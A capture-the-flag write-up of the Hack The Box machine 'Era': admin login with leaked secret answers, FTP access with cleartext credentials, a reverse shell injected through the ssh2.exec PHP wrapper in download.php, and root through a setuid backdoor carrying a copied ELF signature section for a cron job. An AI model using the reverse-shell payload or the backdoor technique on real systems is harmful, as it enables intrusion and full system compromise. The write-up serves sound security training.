# CTF – Era (Writeup)

## Context

In this Hack The Box challenge, the target machine is reachable through the domains `era.htb` and `file.era.htb`.  
The goal is to get initial access to the web app, then escalate privileges up to **root**.

---

## Recon

I start with an Nmap scan to identify the exposed services:

    nmap -sC -sV IP

The scan shows:
- an HTTP service on port 80
- an FTP service

Visiting the following sites:

    http://era.htb
    http://file.era.htb

I find a web-based **file manager** with authentication.

Intercepting the requests with Burp Suite, I spot several interesting endpoints:
- `login.php`
- `register.php`
- `upload.php`
- `download.php`
- `security_login.php`

---

## Fuzzing and application enumeration

I run fuzzing to find more resources.

In the `/js/` folder I find the **fancybox** library.

I then confirm the presence of several sensitive endpoints:
- `register.php`
- `upload.php`
- `download.php`
- `security_login.php`

I test uploading a PHP webshell through `upload.php`.  
The file is stored in the database but **isn't directly executable**, which points to storage outside the document root.

---

## Finding a backup and the SQLite database

Through `download.php`, I manage to download a backup of the site:

    site-backup-30-08-24.zip

Inside the archive I find:
- the site's full PHP source code
- a SQLite database named `filedb.sqlite`

Looking at the `users` table, I recover several accounts and their bcrypt hashes, notably:

- Admin account:
  - `admin_ef01cab31aa`
  - Secret answers: `Maria`, `Oliver`, `Ottawa`

- User accounts:
  - `eric`
  - `veronica`
  - `yuri`
  - `john`
  - `ethan`

---

## Admin authentication bypass

I focus on the sensitive `security_login.php` endpoint.

Using the secret answers recovered from the SQLite database, I authenticate as administrator.

Exploitation with curl:

    curl -s -c jar.txt "http://file.era.htb/security_login.php"

    curl -s -b jar.txt -c jar.txt -X POST "http://file.era.htb/security_login.php" \
      -d "username=admin_ef01cab31aa&answer1=Maria&answer2=Oliver&answer3=Ottawa"

The authentication is bypassed and I get access to the **manage.php** interface.

---

## FTP access

In the site backup I also find FTP credentials stored in cleartext:

- `eric : america`
- `yuri : mustang`

The `yuri` account lets me connect to the FTP server:

    lftp -u yuri,mustang file.era.htb

Inside, I find two main directories:
- `apache2_conf`
- `php8.1_conf`

I download the whole config set with:

    mirror

---

## Looking at the Apache and PHP configs

In `apache2_conf/file.conf` I find:

- `ServerName file.era.htb`
- `DocumentRoot /var/www/file`

In `php8.1_conf` I see many PHP extensions enabled, notably:

- `ssh2.so`

This extension opens the door to using **PHP SSH2 wrappers**.

---

## Exploitation via the ssh2.exec PHP wrapper

Reading the source of `download.php`, I notice that the `show=true` parameter dynamically concatenates a PHP wrapper with the requested file.

Using the `ssh2.exec://` wrapper, you can run local commands with valid credentials.

I abuse this by injecting a reverse shell:

    http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://eric:america@127.0.0.1/bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.14.214/4444%200>%261'

I get a **reverse shell** on my machine as user `eric`.

---

## Privilege escalation

I start by enumerating SUID binaries:

    find / -user root -perm -4000 2>/dev/null

I also run `linpeas.sh` and `pspy` to watch the scheduled tasks.

I find a **cron running as root** that regularly launches:

    /root/initiate_monitoring.sh

That script calls the binary:

    /opt/AV/periodic-checks/monitor

The binary checks a specific section named `.text_sig`.

---

## Exploiting the monitor binary

I compile a minimal backdoor binary:

    #include <stdlib.h>
    int main() {
        setuid(0);
        setgid(0);
        system("/bin/bash -p");
        return 0;
    }

Compilation:

    gcc a.c -o backdoor

I pull the `.text_sig` section from the original binary:

    objcopy --dump-section .text_sig=text_sig monitor.bak

Then I inject it into my malicious binary:

    objcopy --add-section .text_sig=text_sig backdoor

I replace the binary run by the cron:

    cp backdoor monitor

On the cron's next run, the binary executes with **root** privileges, giving me a root shell.

---

## Conclusion

This challenge shows:
- the risk of dangerous PHP wrappers (`ssh2.exec`)
- credentials stored in cleartext inside backups
- the dangers of poor permission handling in root scripts
- the critical impact of binaries run by cron with insufficient checks

---

## Skills demonstrated

- Network recon (Nmap)
- Fuzzing and application analysis
- Reading and exploiting PHP source code
- PHP wrapper exploitation
- Reverse shell
- FTP access and server config analysis
- Linux local enumeration
- Cron job exploitation
- ELF section manipulation
- Privilege escalation up to root
